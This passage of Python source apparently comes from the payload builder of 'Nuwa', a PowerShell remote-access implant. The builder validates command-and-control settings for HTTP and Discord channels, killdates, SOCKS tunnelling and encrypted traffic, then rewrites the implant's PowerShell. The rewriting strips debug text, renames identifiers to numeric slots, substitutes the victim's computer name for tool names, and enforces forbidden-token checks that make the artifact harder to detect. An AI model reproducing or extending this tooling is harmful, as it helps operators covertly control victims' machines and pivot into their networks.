    parsed = urlsplit(callback_host)
    if parsed.scheme.lower() != "https" or not parsed.hostname:
        raise ValueError("require_https requires an HTTP callback_host using HTTPS")


def _coerce_debug_logging(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    raise ValueError("debug_logging must be a Boolean true or false value")


def _coerce_choice(name: str, value: Any, choices: Sequence[str]) -> str:
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized in choices:
            return normalized
    raise ValueError(f"{name} must be one of {list(choices)}")


def _integer_parameter_error(
    parameters: Mapping[str, Any],
    name: str,
    *,
    default: int,
    minimum: int,
    maximum: int | None = None,
) -> str | None:
    value = parameters.get(name, default)
    if isinstance(value, bool):
        return f"{name} must be a whole number"
    try:
        number = int(value)
    except (TypeError, ValueError, OverflowError):
        return f"{name} must be a whole number"
    if isinstance(value, float) and not value.is_integer():
        return f"{name} must be a whole number"
    if isinstance(value, str) and not value.strip().isdigit():
        return f"{name} must be a whole number"
    if number < minimum or (maximum is not None and number > maximum):
        boundary = f"between {minimum} and {maximum}" if maximum is not None else f"at least {minimum}"
        return f"{name} must be {boundary}"
    return None


def _is_origin_without_embedded_port(value: Any, *, allow_trailing_slash: bool) -> bool:
    try:
        parsed = urlsplit(str(value).strip())
        path_choices = {"", "/"} if allow_trailing_slash else {""}
        return (
            parsed.scheme.lower() in {"http", "https"}
            and parsed.hostname is not None
            and parsed.port is None
            and parsed.username is None
            and parsed.password is None
            and parsed.path in path_choices
            and not parsed.query
            and not parsed.fragment
        )
    except (TypeError, ValueError):
        return False


def _profile_parameter_errors(
    c2_profile_name: str,
    c2_parameters: Mapping[str, Any],
) -> list[str]:
    """Validate values that Nuwa embeds and later consumes as runtime settings."""
    errors: list[str] = []
    for name, default, minimum, maximum in (
        ("callback_interval", 3, 0, None),
        ("callback_jitter", 30, 0, 100),
    ):
        error = _integer_parameter_error(
            c2_parameters,
            name,
            default=default,
            minimum=minimum,
            maximum=maximum,
        )
        if error:
            errors.append(error)

    killdate = c2_parameters.get("killdate", "")
    if killdate not in (None, ""):
        try:
            if not isinstance(killdate, date):
                date.fromisoformat(str(killdate))
        except (TypeError, ValueError):
            errors.append("killdate must be a valid YYYY-MM-DD date")

    proxy_host = str(c2_parameters.get("proxy_host", "") or "").strip()
    proxy_port = c2_parameters.get("proxy_port", "")
    proxy_user_present = bool(str(c2_parameters.get("proxy_user", "") or "").strip())
    proxy_pass_present = bool(str(c2_parameters.get("proxy_pass", "") or "").strip())
    proxy_port_present = proxy_port not in (None, "")
    if proxy_host:
        if not _is_origin_without_embedded_port(
            proxy_host,
            allow_trailing_slash=False,
        ):
            errors.append(
                "proxy_host must be an HTTP or HTTPS origin without credentials, path, query, or port"
            )
        if not proxy_port_present:
            errors.append("proxy_port is required when proxy_host is set")
    elif proxy_port_present or proxy_user_present or proxy_pass_present:
        errors.append("proxy_host is required when proxy settings are supplied")
    if proxy_port_present:
        error = _integer_parameter_error(
            c2_parameters,
            "proxy_port",
            default=0,
            minimum=1,
            maximum=65535,
        )
        if error:
            errors.append(error)

    if c2_profile_name == "http":
        callback_host = c2_parameters.get("callback_host", "")
        if not _is_origin_without_embedded_port(
            callback_host,
            allow_trailing_slash=True,
        ):
            errors.append(
                "callback_host must be an HTTP or HTTPS origin without credentials, path, query, or port"
            )
        error = _integer_parameter_error(
            c2_parameters,
            "callback_port",
            default=80,
            minimum=1,
            maximum=65535,
        )
        if error:
            errors.append(error)
        headers = c2_parameters.get("headers", {})
        if not isinstance(headers, Mapping):
            errors.append("headers must be a dictionary")
    elif c2_profile_name == "discordx":
        user_agent = c2_parameters.get("user_agent", DEFAULT_DISCORD_USER_AGENT)
        if (
            not isinstance(user_agent, str)
            or not user_agent.strip()
            or any(ord(char) < 32 or ord(char) == 127 for char in user_agent)
        ):
            errors.append("user_agent must be a nonempty HTTP header value without control characters")
        if not str(c2_parameters.get("discord_token", "") or "").strip():
            errors.append("discord_token is required")
        channel = str(c2_parameters.get("bot_channel", "") or "").strip()
        if not channel:
            errors.append("bot_channel is required")
        elif not channel.isdigit():
            errors.append("bot_channel must be a numeric Discord channel ID")
        for name, default, minimum in (
            ("message_checks", 10, 1),
            ("time_between_checks", 10, 0),
        ):
            error = _integer_parameter_error(
                c2_parameters,
                name,
                default=default,
                minimum=minimum,
            )
            if error:
                errors.append(error)
    return errors


def _resolve_command_names(command_names: Any) -> tuple[tuple[str, ...], list[str]]:
    if command_names is None:
        return tuple(DEFAULT_COMMANDS), []
    if isinstance(command_names, (str, bytes)) or not isinstance(command_names, Sequence):
        return (), ["command selection must be a list of command names"]
    raw_names = command_names or DEFAULT_COMMANDS
    requested_list: list[Any] = []
    for name in raw_names:
        if name not in requested_list:
            requested_list.append(name)
    requested = tuple(requested_list)
    errors: list[str] = []
    for command_name in requested:
        if not isinstance(command_name, str) or not command_name.strip():
            errors.append("command selection contains an invalid command name")
            continue
        if not (COMMAND_ROOT / f"{command_name}.ps1").is_file():
            errors.append(f"command '{command_name}' is not supported by Nuwa")
    return tuple(str(name) for name in requested), errors


def _payload_compatibility_errors(
    *,
    c2_profile_name: str,
    c2_parameters: Mapping[str, Any],
    framing_mode: str,
    codec_profile: str,
    protection_profile: str,
    exchange_enabled: bool,
    transport_envelope: TransportEnvelopeSelection,
) -> list[str]:
    errors: list[str] = []
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        errors.append("Nuwa requires a supported binary codec_profile")
    if framing_mode != "raw":
        errors.append("Nuwa binary messages require use_base64=false")
    if not transport_envelope.enabled or transport_envelope.envelope_format != "binary-v1":
        errors.append("Nuwa binary messages require a binary-v1 fixed transport envelope")
    if c2_profile_name == "discordx":
        wire_protocol = str(c2_parameters.get("wire_protocol", "fixed") or "").strip().lower()
        if wire_protocol != "fixed":
            errors.append(
                "wire_protocol must be 'fixed' for Nuwa payloads; the legacy DiscordX "
                "listener does not implement Nuwa's fixed transport envelope"
            )
    if exchange_enabled and protection_profile != PROTECTION_AES256_HMAC_V1:
        errors.append(
            "encrypted_exchange_check can be enabled only with the "
            "nuwa_aes256_hmac_v1 protection profile and one matching 32-byte key"
        )
    return errors


def _socks_build_errors(
    *, c2_profile_name: str, c2_parameters: Mapping[str, Any],
    powershell_runtime: str, command_names: Sequence[str],
) -> list[str]:
    if "socks" not in command_names:
        return []
    errors: list[str] = []
    if c2_profile_name != "discordx":
        errors.append("Nuwa SOCKS requires DiscordX C2")
    if powershell_runtime != POWERSHELL_RUNTIME_FULL:
        errors.append("Nuwa SOCKS requires FullLanguage PowerShell; CLM TCP proof failed")
    channel = str(c2_parameters.get("socks_channel", "") or "").strip()
    normal_channel = str(c2_parameters.get("bot_channel", "") or "").strip()
    if not channel:
        errors.append("socks_channel is required when socks is selected")
    elif not channel.isdigit():
        errors.append("socks_channel must be a numeric Discord channel ID")
    elif channel == normal_channel:
        errors.append("socks_channel must be different from bot_channel")
    return errors


def _validate_socks_build(**kwargs: Any) -> bool:
    errors = _socks_build_errors(**kwargs)
    if errors:
        raise InvalidPayloadOptions(errors)
    return "socks" in kwargs["command_names"]


def _socks_source_paths(codec_profile: str) -> tuple[pathlib.Path, ...]:
    suffix = "_v2" if codec_profile == "binary-v2" else ""
    return (
        SOCKS_ROOT / "gateway.ps1",
        SOCKS_ROOT / f"outbound{suffix}.ps1",
        SOCKS_ROOT / f"runtime{suffix}.ps1",
        SOCKS_ROOT / "tcp.ps1",
        SOCKS_ROOT / f"traffic{suffix}.ps1",
    )


def _render_numeric_socks_module(path: pathlib.Path, profile: ResolvedControlProfile | None = None) -> str:
    source = _read_text(path)
    if path.name == "gateway.ps1":
        source = source.replace("UserAgent.ParseAdd('Nuwa/1.0')", "UserAgent.ParseAdd((Get-NuwaDiscordUserAgent))")
        source = source.replace("browser = 'Nuwa'; device = 'Nuwa'", "browser = $env:COMPUTERNAME; device = $env:COMPUTERNAME")
    if path.name == "traffic_v2.ps1":
        source = source.replace(
            "$script:NuwaConfig.ProtectionProfile -and\n        [string]$script:NuwaConfig.ProtectionProfile -ne 'none'",
            "[int]$script:NuwaConfig.ProtectionProfile -ne 0",
        )
        for name in ("request", "connecting", "connected"):
            source = source.replace(f"'{name}'", f"$script:NuwaT_{name}")
    if path.name == "runtime_v2.ps1":
        source = source.replace(
            "else { 'Gateway readiness timed out' }",
            "else { New-NuwaDiagnosticOutput -Code 1237 }",
        )

    # These are private hashtable records shared by the SOCKS worker and its
    # helper functions. Discord's lower-case JSON keys remain at that boundary.
    names = "|".join(sorted(SOCKS_PRIVATE_SLOT_NAMES, key=len, reverse=True))
    bare = re.compile(rf"(?m)(^\s*|[;{{]\s*)({names})(?=\s*=)")
    slot_cast = "" if profile is not None and profile.kind == "binary-v3" else "[int]"
    source = bare.sub(lambda match: f"{match.group(1)}({slot_cast}$script:NuwaR_{match.group(2)})", source)

    roots_by_file = {
        "gateway.ps1": ("Gateway", "Worker", "Shared"),
        "outbound_v2.ps1": ("Worker", "Batch", "batch", "active"),
        "traffic_v2.ps1": ("Worker", "connection", "request"),
        "runtime_v2.ps1": ("runtime", "shared", "script:NuwaSocksRuntime"),
        "tcp.ps1": (),
    }
    roots = roots_by_file[path.name]
    if roots:
        root_pattern = "|".join(re.escape(root) for root in roots)
        # Rewrite the second key in nested private records before the first.
        nested = re.compile(
            rf"(\$(?:{root_pattern})\.(?:Shared|Pending|ActivePost|CleanupTask))\."
            r"(Ports|Ready|Stop|Error|Id|Due|Task)\b",
            re.IGNORECASE,
        )
        source = nested.sub(lambda match: f"{match.group(1)}[$script:NuwaR_{match.group(2)}]", source)
        members = re.compile(rf"\$(?:{root_pattern})\.([A-Za-z][A-Za-z0-9]*)", re.IGNORECASE)

        def replace_member(match: re.Match[str]) -> str:
            key = match.group(1)
            canonical = next((name for name in SOCKS_PRIVATE_SLOT_NAMES if name.lower() == key.lower()), None)
            if canonical is None:
                return match.group(0)
            return f"{match.group(0)[:-len(key)-1]}[$script:NuwaR_{canonical}]"

        source = members.sub(replace_member, source)
    return source


def _render_numeric_socks_slot_ids(profile: ResolvedControlProfile | None = None) -> str:
    fields = "\n".join(
        f"$script:NuwaR_{name} = {_ps_literal(identifier)}"
        for name, identifier in _control_ids(profile, "socks_private_slots", SOCKS_PRIVATE_SLOT_IDS).items()
    )
    states = _control_ids(profile, "socks_states", {"request": 1, "connecting": 2, "connected": 3})
    return fields + "\n" + "\n".join(
        f"$script:NuwaT_{name} = {_ps_literal(value)}" for name, value in states.items()
    )


def _render_socks_agent_main_source(source: str, *, selected: bool, codec_profile: str = "binary-v1") -> str:
    if not selected:
        return source
    if codec_profile == "binary-v2":
        return _replace_source_once(
            source,
            '        } else {\n            throw ("Unsupported command code {0}" -f $commandCode)\n        }',
            '        } elseif ($commandCode -eq $script:NuwaC_socks) {\n'
            '            $response[$script:NuwaF_user_output] = Invoke-NuwaSocks -Parameters $parameters\n'
            '        } else {\n            throw ("Unsupported command code {0}" -f $commandCode)\n        }',
            label="selected numeric SOCKS command dispatch",
        )
    return _replace_source_once(
        source,
        "            default {\n                throw (\"Unsupported command '{0}'\" -f $commandName)\n            }",
        "            'socks' {\n"
        "                $response.user_output = Invoke-NuwaSocks -Parameters $parameters\n"
        "            }\n"
        "            default {\n                throw (\"Unsupported command '{0}'\" -f $commandName)\n            }",
        label="selected SOCKS command dispatch",
    )


def _validate_payload_compatibility(**kwargs: Any) -> None:
    errors = _payload_compatibility_errors(**kwargs)
    if errors:
        raise InvalidPayloadOptions(errors)


def _resolve_payload_options(
    *,
    c2_profile_name: Any,
    c2_parameters: Any,
    codec_profile: Any,
    debug_logging: Any,
    require_https: Any,
    powershell_runtime: Any,
    command_names: Any,
) -> PayloadOptionSelection:
    """Normalize and exhaustively validate one submitted Nuwa payload configuration."""
    errors: list[str] = []

    def capture(function: Any) -> Any:
        try:
            return function()
        except (TypeError, ValueError) as exc:
            errors.append(str(exc))
            return None

    profile_name = capture(
        lambda: _coerce_choice(
            "c2_profile",
            c2_profile_name,
            ("http", "discordx"),
        )
    )
    parameters: Mapping[str, Any]
    if isinstance(c2_parameters, Mapping):
        parameters = c2_parameters
    else:
        errors.append("C2 parameters must be a dictionary")
        parameters = {}

    codec = capture(
        lambda: _coerce_choice("codec_profile", codec_profile, POWERSHELL_CODEC_PROFILES)
    )
    debug = capture(lambda: _coerce_debug_logging(debug_logging))
    https_required = capture(lambda: _coerce_require_https(require_https))
    runtime = capture(lambda: _coerce_powershell_runtime(powershell_runtime))
    commands, command_errors = _resolve_command_names(command_names)
    errors.extend(command_errors)
    if profile_name is not None and runtime is not None:
        errors.extend(_socks_build_errors(
            c2_profile_name=profile_name, c2_parameters=parameters,
            powershell_runtime=runtime, command_names=commands,
        ))

    protection = capture(
        lambda: _resolve_protection_selection(parameters.get("AESPSK"))
    )
    framing = (
        capture(lambda: _resolve_framing_mode(profile_name, dict(parameters)))
        if profile_name is not None
        else None
    )
    exchange = (
        capture(
            lambda: _coerce_encrypted_exchange(
                profile_name,
                parameters.get("encrypted_exchange_check"),
            )
        )
        if profile_name is not None
        else None
    )
    transport = (
        capture(
            lambda: _resolve_transport_envelope_selection(
                profile_name,
                dict(parameters),
            )
        )
        if profile_name is not None
        else None
    )

    if profile_name is not None:
        errors.extend(_profile_parameter_errors(profile_name, parameters))
        if https_required is not None:
            capture(
                lambda: _validate_https_policy(
                    c2_profile_name=profile_name,
                    c2_parameters=dict(parameters),
                    require_https=https_required,
                )
            )
        if framing == "raw":
            capture(lambda: _validate_raw_parameters(profile_name, dict(parameters)))

    if (
        protection is not None
        and exchange is not None
        and exchange
        and protection.profile != PROTECTION_AES256_HMAC_V1
    ):
        errors.append(
            "encrypted_exchange_check can be enabled only with the "
            "nuwa_aes256_hmac_v1 protection profile and one matching 32-byte key"
        )

    if all(
        item is not None
        for item in (profile_name, codec, protection, framing, exchange, transport)
    ):
        errors.extend(
            _payload_compatibility_errors(
                c2_profile_name=profile_name,
                c2_parameters=parameters,
                framing_mode=framing,
                codec_profile=codec,
                protection_profile=protection.profile,
                exchange_enabled=exchange,
                transport_envelope=transport,
            )
        )

    if errors:
        raise InvalidPayloadOptions(errors)

    if debug is None or https_required is None or runtime is None:
        raise InvalidPayloadOptions(("payload option normalization failed",))
    return PayloadOptionSelection(
        c2_profile_name=profile_name,
        codec_profile=codec,
        debug_logging=debug,
        require_https=https_required,
        powershell_runtime=runtime,
        command_names=commands,
        framing_mode=framing,
        protection=protection,
        exchange_enabled=exchange,
        staging_enabled=exchange and protection.profile == PROTECTION_AES256_HMAC_V1,
        transport_envelope=transport,
    )


def _replace_source_once(source: str, old: str, new: str, *, label: str) -> str:
    count = source.count(old)
    if count != 1:
        raise ValueError(
            f"Protected agent source expected one {label} marker but found {count}"
        )
    return source.replace(old, new, 1)


def _replace_marked_source_region(
    source: str,
    *,
    begin_marker: str,
    end_marker: str,
    replacement: str,
    label: str,
) -> str:
    if source.count(begin_marker) != 1 or source.count(end_marker) != 1:
        raise ValueError(f"Agent source expected one {label} region")
    start = source.index(begin_marker)
    end = source.index(end_marker, start) + len(end_marker)
    return source[:start] + replacement.rstrip() + "\n" + source[end:]


def _render_protected_agent_main_source(codec_profile: str = "binary-v1") -> str:
    source = _read_text(BASE_CODE_ROOT / ("agent_main_v2.ps1" if codec_profile == "binary-v2" else "agent_main.ps1"))
    action = "$script:NuwaA_checkin" if codec_profile == "binary-v2" else "'checkin'"
    source = _replace_source_once(
        source,
        f"$response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action {action}",
        f"$response = Invoke-NuwaSendMessage -Uuid $script:NuwaCryptoState.OuterUuid -Action {action}",
        label="check-in transport UUID",
    )
    return source


def _replace_v2_fixed_diagnostics(
    source: str, *, debug_logging: bool = True, allow_v3: bool = False,
    control_profile: ResolvedControlProfile | None = None,
) -> str:
    formatted = {
        'throw ("Unsupported command code {0}" -f $commandCode)': (
            'Unsupported command code {0}', '$commandCode'
        ),
        'throw ("HTTP request failed with status {0}" -f [int]$webRequest.Status)': (
            'HTTP request failed with status {0}', '[int]$webRequest.Status'
        ),
        "throw ('Discord GET failed with HTTP {0}' -f [int]$response.StatusCode)": (
            'Discord GET failed with HTTP {0}', '[int]$response.StatusCode'
        ),
        "throw ('Discord recovery GET failed with HTTP {0}' -f $status)": (
            'Discord recovery GET failed with HTTP {0}', '[int]$status'
        ),
    }
    for old, (message, argument) in formatted.items():
        if old in source:
            code = AGENT_DIAGNOSTIC_CATALOG_V2[message]
            source = source.replace(
                old,
                f'throw (New-NuwaDiagnosticOutput -Code {code} -Arguments @({argument}))',
            )

    pattern = re.compile(r"\bthrow\s+'([^'\r\n]+)'", re.IGNORECASE)

    def replace(match: re.Match[str]) -> str:
        message = match.group(1)
        try:
            code = AGENT_DIAGNOSTIC_CATALOG_V2[message]
        except KeyError as exc:
            if allow_v3 and ("v3" in message.lower() or message.startswith("Unsupported binary v3")):
                return match.group(0)
            raise ValueError(f"Uncataloged Nuwa v2 thrown diagnostic: {message}") from exc
        return f"throw (New-NuwaDiagnosticOutput -Code {code})"

    source = pattern.sub(replace, source)
    if not debug_logging:
        # Only thrown records are failures: success records retain their data.
        source = re.sub(
            r"\bthrow\s+\(New-NuwaDiagnosticOutput -Code \d+"
            r"(?: -Arguments @\([^()\r\n]*\))?\)",
            f"throw (New-NuwaDiagnosticOutput -Code {AGENT_DIAGNOSTIC_CATALOG_V2['Task failed']})",
            source,
        )
    if allow_v3:
        if control_profile is None:
            raise ValueError("Nuwa v3 diagnostic replacement requires a control profile")
        codes = control_profile.namespaces["diagnostic_codes"]
        # The resolved value can be embedded directly; no payload-side lookup is needed.
        def selected_code(match: re.Match[str]) -> str:
            name = f"code_{match.group(1)}"
            if name not in codes:
                raise ValueError(f"Uncataloged Nuwa v3 diagnostic code: {name}")
            return f"-Code {_ps_literal(codes[name])}"
        source = re.sub(r"-Code\s+(\d+)\b", selected_code, source)
    return source


def _render_discord_byte_agent_main_source(source: str) -> str:
    return source


def _strip_debug_calls(source: str) -> str:
    lines = source.splitlines(keepends=True)
    selected: list[str] = []
    index = 0
    while index < len(lines):
        stripped = lines[index].strip()
        if not stripped.startswith("Write-NuwaDebug"):
            selected.append(lines[index])
            index += 1
            continue
        if not re.match(r"^[ \t]*Write-NuwaDebug(?:[ \t]|$)", lines[index]):
            raise ValueError("Unsupported Nuwa debug call")
        if stripped == "Write-NuwaDebug (":
            indent = lines[index][:len(lines[index]) - len(lines[index].lstrip())]
            index += 1
            while index < len(lines) and lines[index].strip("\r\n") != indent + ")":
                index += 1
            if index == len(lines):
                raise ValueError("Unclosed multiline Nuwa debug call")
        index += 1
    return "".join(selected)


def _render_debug_mode(source: str, *, enabled: bool, codec_profile: str) -> str:
    """Select debug PowerShell at build time, without a runtime debug flag.

    Debug calls in the checked-in modules are standalone statements. A call
    split across lines starts with exactly ``Write-NuwaDebug (`` and ends with
    a closing parenthesis at the same indentation. Reject a new shape instead
    of silently shipping it in a release payload.
    """
    lines = source.splitlines(keepends=True)
    selected: list[str] = []
    index = 0
    guard_count = 0
    expected_guard_count = source.count("$script:NuwaConfig.DebugLogging")
    guard_pattern = re.compile(
        r"^([ \t]*)if \((?:\[bool\])?\$script:NuwaConfig\.DebugLogging\) \{\s*$"
    )
    while index < len(lines):
        match = guard_pattern.match(lines[index])
        if match is None:
            selected.append(lines[index])
            index += 1
            continue
        guard_count += 1
        indent = match.group(1)
        end = index + 1
        while end < len(lines) and lines[end].strip("\r\n") != indent + "}":
            end += 1
        if end == len(lines):
            raise ValueError("Unclosed Nuwa debug guard")
        if enabled:
            selected.extend(lines[index + 1:end])
        index = end + 1
    if guard_count != expected_guard_count or guard_count < 1:
        raise ValueError(
            f"Expected {expected_guard_count} Nuwa debug guards, found {guard_count}"
        )
    source = "".join(selected)

    if not enabled:
        source, count = re.subn(
            r"(?ms)^function Write-NuwaDebug \{\n.*?^\}\n(?=\nfunction Resolve-NuwaPath \{)",
            "",
            source,
        )
        if count != 1:
            raise ValueError(f"Expected one Nuwa debug function, found {count}")

        # These Discord values are calculated only to format a debug message.
        discord_debug_values = (
            "            $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'client_id')\n"
            "            if ([string]::IsNullOrWhiteSpace($matchedClientId)) {\n"
            "                $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'sender_id')\n"
            "            }\n"
            "            $matchedMessageId = [string](Get-NuwaDiscordCandidateSlot -Candidate $matched -Slot 3)\n"
        )
        if "$matchedClientId" in source:
            if source.count(discord_debug_values) != 1:
                raise ValueError("Expected one Discord debug value block")
            source = source.replace(discord_debug_values, "", 1)

        source = _strip_debug_calls(source)
        if any(token in source for token in ("Write-NuwaDebug", "[Status]", "$matchedClientId", "$matchedMessageId")):
            raise ValueError("Release Nuwa source retains debug code")
    if "DebugLogging" in source:
        raise ValueError("Nuwa source retains a runtime debug flag")

    begin = "        # NUWA_TASK_ERROR_BEGIN"
    end = "        # NUWA_TASK_ERROR_END"
    if enabled:
        for marker in (begin, end):
            source = _replace_source_once(source, marker + "\n", "", label="task error marker")
    else:
        output = (
            "$response[$script:NuwaF_user_output] = New-NuwaDiagnosticOutput "
            f"-Code {AGENT_DIAGNOSTIC_CATALOG_V2['Task failed']}"
            if codec_profile == "binary-v2" else "$response.user_output = 'Task failed'"
        )
        source = _replace_marked_source_region(
            source, begin_marker=begin, end_marker=end,
            replacement="        " + output, label="task error output",
        )
    return source


def _render_staged_agent_runtime_source(codec_profile: str = "binary-v1") -> str:
    source = _render_protected_agent_main_source(codec_profile)
    response_id = "$response[$script:NuwaF_id]" if codec_profile == "binary-v2" else "$response.id"
    crypto_transition = (
        [
            "$script:NuwaCryptoState = " + _ps_empty_crypto_slots(),
            "$script:NuwaCryptoState[$script:NuwaK_OuterUuid] = $callbackUuid",
            "$script:NuwaCryptoState[$script:NuwaK_Key] = [byte[]]$previousKey",
        ]
        if codec_profile == "binary-v2" else [
            "$script:NuwaCryptoState = @{",
            "    OuterUuid = $callbackUuid",
            "    Key = [byte[]]$script:NuwaCryptoState.Key",
            "}",
        ]
    )
    if codec_profile == "binary-v2":
        crypto_transition.insert(0, "$previousKey = [byte[]]$script:NuwaCryptoState.Key")
    source = _replace_source_once(
        source,
        f"            $script:NuwaState.CallbackUUID = [string]{response_id}\n",
        "\n".join(
            [
                f"            $callbackUuid = [string]{response_id}",
                *("            " + line for line in crypto_transition),
                "            $script:NuwaState.CallbackUUID = $callbackUuid",
                "",
            ]
        ),
        label="staged callback crypto-state transition",
    )
    return _replace_source_once(
        source,
        "\nStart-Nuwa\n",
        "\n",
        label="protected auto-start",
    )


def _resolve_selected_c2_profile(c2info: list[Any]) -> SelectedC2Profile:
    if len(c2info) != 1:
        raise ValueError("Nuwa build requires exactly one C2 profile")

    c2 = c2info[0]
    profile = c2.get_c2profile()
    profile_name = str(profile.get("name", "")).strip().lower()
    if profile_name not in {"http", "discordx"}:
        raise ValueError(f"Unsupported Nuwa C2 profile '{profile_name}'")

    return SelectedC2Profile(
        name=profile_name,
        parameters=dict(c2.get_parameters_dict()),
    )


def _coerce_use_base64(value: Any) -> bool:
    if value is None:
        return True
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized == "true":
            return True
        if normalized == "false":
            return False
    raise ValueError("use_base64 must be a Boolean true or false value")


def _resolve_framing_mode(
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
) -> str:
    if c2_profile_name in {"http", "discordx"}:
        return "legacy" if _coerce_use_base64(c2_parameters.get("use_base64")) else "raw"
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _validate_raw_parameters(c2_profile_name: str, c2_parameters: dict[str, Any]) -> None:
    if any(
        str(c2_parameters.get(name, "")).strip()
        for name in ("proxy_user", "proxy_pass")
    ):
        raise ValueError(
            f"Raw {c2_profile_name.upper()} credentialed proxies require legacy mode"
        )

    if c2_profile_name != "http":
        return

    headers = dict(c2_parameters.get("headers", {}))
    for name, value in headers.items():
        if str(name).lower() != "x-agent-body-format":
            continue
        if str(value).strip().lower() != "raw-v1":
            raise ValueError(
                "X-Agent-Body-Format conflicts with the required raw-v1 selector"
            )


def _validate_raw_artifact(payload: bytes) -> None:
    if FORBIDDEN_RAW_ARTIFACT_PATTERN.search(payload) is not None:
        raise ValueError("Raw artifact violates the forbidden-token invariant")


def _validate_staged_raw_artifact(
    payload: bytes,
    staging_module: bytes,
    *,
    allow_base64_tokens: bool = False,
) -> None:
    if payload.count(staging_module) != 1:
        raise ValueError("Staged raw artifact must contain exactly one staging module")
    without_staging_module = payload.replace(staging_module, b"", 1)
    if not allow_base64_tokens:
        _validate_raw_artifact(without_staging_module)
    for legacy_marker in (
        rb"\bConvertTo-NuwaTransportEnvelope(?:\s|$)",
        rb"\bConvertFrom-NuwaTransportEnvelope(?:\s|$)",
        rb"\bConvertTo-NuwaBase64String(?:\s|$)",
        rb"\bConvertFrom-NuwaBase64String(?:\s|$)",
    ):
        if re.search(legacy_marker, payload) is not None:
            raise ValueError("Staged raw artifact contains legacy framing helpers")


def _decode_codec_profiles(codec_profile: str) -> tuple[str, ...]:
    """Return the one codec implementation selected for this artifact."""
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    return (codec_profile,)


def _render_static_codec_dispatch_source(
    codec_profile: str,
    *,
    protected: bool = False,
) -> str:
    if codec_profile == "binary-v2":
        encode_protection = (
            "[byte[]](Protect-NuwaBytes -Bytes $binary -Context $Context)"
            if protected else "$binary"
        )
        decode_protection = (
            "[byte[]](Unprotect-NuwaBytes -Bytes $WireBytes -Context $Context)"
            if protected else "$WireBytes"
        )
        source = r'''
function ConvertTo-NuwaWireBytes {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][System.Collections.IDictionary]$Message,
          [Parameter(Mandatory = $true)][hashtable]$Context)
    foreach ($response in @($Message[$script:NuwaF_responses])) {
        if ($null -eq $response) { continue }
        if ($response.Contains($script:NuwaF_chunk_data)) {
            $response[$script:NuwaF_chunk_data] = [byte[]]$response[$script:NuwaF_chunk_data]
        }
        $download = $response[$script:NuwaF_download]
        if ($null -ne $download -and $download.Contains($script:NuwaF_chunk_data)) {
            $download[$script:NuwaF_chunk_data] = [byte[]]$download[$script:NuwaF_chunk_data]
        }
    }
    $binary = [byte[]](ConvertTo-NuwaBinaryV2Bytes -Message $Message)
    return ,([byte[]](__ENCODE_PROTECTION__))
}

function ConvertFrom-NuwaWireBytes {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$WireBytes,
          [Parameter(Mandatory = $true)][hashtable]$Context)
    $binary = __DECODE_PROTECTION__
    $message = ConvertFrom-NuwaBinaryV2Bytes -Bytes ([byte[]]$binary)
    return ((ConvertTo-NuwaAgentJsonValue -Value $message) | ConvertTo-Json -Compress -Depth 20)
}
'''
        return (source.replace("__ENCODE_PROTECTION__", encode_protection)
                      .replace("__DECODE_PROTECTION__", decode_protection).strip() + "\n")
    if codec_profile == "binary-v1":
        encode_protection = (
            "[byte[]](Protect-NuwaBytes -Bytes $binary -Context $Context)"
            if protected else "$binary"
        )
        decode_protection = (
            "[byte[]](Unprotect-NuwaBytes -Bytes $WireBytes -Context $Context)"
            if protected else "$WireBytes"
        )
        source = r'''
function ConvertTo-NuwaWireBytes {
    [CmdletBinding()]
    param([hashtable]$Message, [string]$MessageJson, [Parameter(Mandatory = $true)][hashtable]$Context)
    if ($null -ne $Message) {
        $message = $Message
    } else {
        $parsed = $MessageJson | ConvertFrom-Json -ErrorAction Stop
        if ($null -eq $parsed -or -not $MessageJson.TrimStart().StartsWith('{')) { throw 'Nuwa message must be a map' }
        $message = @{}
        foreach ($property in $parsed.PSObject.Properties) { $message[$property.Name] = $property.Value }
    }
    foreach ($response in @($message.responses)) {
        if ($null -eq $response) { continue }
        if (($response -is [System.Collections.IDictionary] -and $response.Contains('chunk_data')) -or
            $null -ne $response.PSObject.Properties['chunk_data']) {
            $response.chunk_data = [byte[]]@($response.chunk_data)
        }
        if ($null -ne $response.download -and
            (($response.download -is [System.Collections.IDictionary] -and $response.download.Contains('chunk_data')) -or
             $null -ne $response.download.PSObject.Properties['chunk_data'])) {
            $response.download.chunk_data = [byte[]]@($response.download.chunk_data)
        }
    }
    $binary = [byte[]](ConvertTo-NuwaBinaryV1Bytes -Message $message)
    return ,([byte[]](__ENCODE_PROTECTION__))
}

function ConvertFrom-NuwaWireBytes {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$WireBytes, [Parameter(Mandatory = $true)][hashtable]$Context)
    $binary = __DECODE_PROTECTION__
    $message = ConvertFrom-NuwaBinaryV1Bytes -Bytes ([byte[]]$binary)
    return ($message | ConvertTo-Json -Compress -Depth 20)
}
'''
        return (source.replace("__ENCODE_PROTECTION__", encode_protection)
                      .replace("__DECODE_PROTECTION__", decode_protection).strip() + "\n")
    function_names = {
        "raw": ("ConvertTo-NuwaRawBytes", "ConvertFrom-NuwaRawBytes"),
        "base64": ("ConvertTo-NuwaRadix64Bytes", "ConvertFrom-NuwaRadix64Bytes"),
        "decimal": ("ConvertTo-NuwaDecimalBytes", "ConvertFrom-NuwaDecimalBytes"),
        "emoji": ("ConvertTo-NuwaEmojiBytes", "ConvertFrom-NuwaEmojiBytes"),
    }
    try:
        encoder, decoder = function_names[codec_profile]
    except KeyError as exc:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'") from exc
    encode_input = (
        "[byte[]](Protect-NuwaBytes -Bytes (ConvertTo-NuwaUtf8Bytes -Value $MessageJson) -Context $Context)"
        if protected
        else "[byte[]](ConvertTo-NuwaUtf8Bytes -Value $MessageJson)"
    )
    decode_input = (
